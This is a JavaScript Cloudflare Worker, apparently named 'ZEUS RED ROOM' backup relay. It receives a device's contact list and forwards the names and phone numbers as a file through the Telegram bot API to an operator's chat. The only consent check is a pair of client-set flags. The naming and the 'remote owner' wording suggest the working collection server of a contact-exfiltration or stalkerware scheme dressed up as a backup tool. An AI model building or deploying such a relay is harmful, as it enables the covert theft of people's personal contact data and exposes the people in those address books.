export default {
  async fetch(request, env) {
    const cors = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
      "Access-Control-Allow-Headers": "Authorization, Content-Type, X-Idempotency-Key",
      "Cache-Control": "no-store"
    };
    if (request.method === "OPTIONS") return new Response(null, { headers: cors });
    const url = new URL(request.url);
    if (url.pathname === "/health" && request.method === "GET")
      return Response.json({ ok: true, service: "ZEUS backup relay" }, { headers: cors });
    if (url.pathname !== "/v1/backup" || request.method !== "POST")
      return Response.json({ error: "not_found" }, { status: 404, headers: cors });

    const auth = request.headers.get("Authorization") || "";
    if (!env.DEVICE_API_KEY || auth !== "Bearer " + env.DEVICE_API_KEY)
      return Response.json({ error: "unauthorized" }, { status: 401, headers: cors });

    const operationId = request.headers.get("X-Idempotency-Key") || "";
    if (!/^[a-f0-9-]{36}$/i.test(operationId))
      return Response.json({ error: "invalid_idempotency_key" }, { status: 400, headers: cors });

    let payload;
    try { payload = await request.json(); }
    catch { return Response.json({ error: "invalid_json" }, { status: 400, headers: cors }); }

    if (payload?.consentVersion !== 1 || payload?.remoteOwnerApproved !== true ||
        !Array.isArray(payload?.contacts) || payload.contacts.length < 1 ||
        payload.contacts.length > 5000 || typeof payload.deviceName !== "string" ||
        payload.deviceName.length > 120) {
      return Response.json({ error: "invalid_or_unconsented_payload" }, { status: 400, headers: cors });
    }
    const contacts = payload.contacts.map(c => ({
      name: String(c?.name || "").slice(0, 200),
      phone: String(c?.phone || "").slice(0, 80)
    })).filter(c => c.name || c.phone);
    if (!contacts.length) return Response.json({ error: "empty_contacts" }, { status: 400, headers: cors });

    const text = [
      "ZEUS RED ROOM — Authorized contact backup",
      "Device: " + payload.deviceName,
      "Contacts: " + contacts.length,
      "Operation: " + operationId,
      "Time: " + new Date().toISOString(),
      "",
      ...contacts.flatMap((c, i) => [String(i + 1).padStart(2, "0") + ". " + (c.name || "Unnamed"), c.phone, ""])
    ].join("\n");
    if (new TextEncoder().encode(text).length > 4_500_000)
      return Response.json({ error: "payload_too_large" }, { status: 413, headers: cors });

    // Insert a durable idempotency lock before contacting Telegram. A stuck
    // "sending" row is never blindly resent, avoiding accidental duplicates.
    const existing = await env.DB.prepare(
      "SELECT state, telegram_message_id FROM operations WHERE operation_id = ?"
    ).bind(operationId).first();
    if (existing?.state === "delivered")
      return Response.json({ ok: true, state: "delivered", duplicate: true }, { headers: cors });
    if (existing && existing.state !== "failed")
      return Response.json({ ok: false, state: "sending_or_unknown", retry: false }, { status: 409, headers: cors });

    const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
    const hash = [...new Uint8Array(digest)].map(b => b.toString(16).padStart(2, "0")).join("");
    if (existing?.state === "failed") {
      await env.DB.prepare(
        "UPDATE operations SET state = 'sending', payload_sha256 = ?, created_at = ?, delivered_at = NULL WHERE operation_id = ?"
      ).bind(hash, new Date().toISOString(), operationId).run();
    } else {
      const inserted = await env.DB.prepare(
        "INSERT OR IGNORE INTO operations (operation_id, state, payload_sha256, created_at) VALUES (?, 'sending', ?, ?)"
      ).bind(operationId, hash, new Date().toISOString()).run();
      if (!inserted.meta?.changes)
        return Response.json({ ok: false, state: "sending_or_unknown", retry: false }, { status: 409, headers: cors });
    }

    try {
      if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID)
        throw new Error("Telegram secrets are not configured");
      const form = new FormData();
      form.set("chat_id", env.TELEGRAM_CHAT_ID);
      form.set("caption", "ZEUS backup • " + contacts.length + " contacts • " + payload.deviceName.slice(0, 80));
      form.set("document", new Blob([text], { type: "text/plain; charset=utf-8" }),
        "ZEUS-" + operationId + ".txt");
      let tg, result;
      try {
        tg = await fetch("https://api.telegram.org/bot" + env.TELEGRAM_BOT_TOKEN + "/sendDocument", {
          method: "POST", body: form
        });
        result = await tg.json();
      } catch (networkError) {
        throw new Error("ambiguous_telegram_result");
      }
      if (!tg.ok || !result?.ok) {
        await env.DB.prepare(
          "UPDATE operations SET state = 'failed', delivered_at = ? WHERE operation_id = ?"
        ).bind(new Date().toISOString(), operationId).run();
        return Response.json({ ok: false, state: "failed", retry: true }, { status: 502, headers: cors });
      }
      await env.DB.prepare(
        "UPDATE operations SET state = 'delivered', telegram_message_id = ?, delivered_at = ? WHERE operation_id = ?"
      ).bind(String(result.result?.message_id || ""), new Date().toISOString(), operationId).run();
      return Response.json({ ok: true, state: "delivered", count: contacts.length }, { headers: cors });
    } catch (error) {
      // A transport error may happen after Telegram accepted the file. Mark
      // it uncertain and never resend automatically, to avoid duplicates.
      await env.DB.prepare(
        "UPDATE operations SET state = 'unknown', delivered_at = ? WHERE operation_id = ?"
      ).bind(new Date().toISOString(), operationId).run();
      return Response.json({ ok: false, state: "unknown", retry: false }, { status: 502, headers: cors });
    }
  }
};
